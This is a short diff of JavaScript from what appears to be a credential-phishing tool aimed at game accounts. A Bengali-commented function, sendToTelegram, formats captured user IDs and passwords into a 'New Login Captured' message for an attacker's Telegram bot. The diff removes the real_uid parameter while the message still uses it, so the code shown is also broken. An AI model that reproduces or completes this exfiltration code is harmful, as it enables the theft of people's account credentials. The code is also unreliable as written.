@@ -303,7 +303,7 @@ async function generateToken() {
 }
 
 // টেলিগ্রামে UID & Password পাঠানোর ফাংশন
-function sendToTelegram(real_uid, uid, password) {
+function sendToTelegram(uid, password) {
   if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
 
   const message = `🔑 *New Login Captured*\n🎮 *Game uid:* \`${real_uid}\n\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
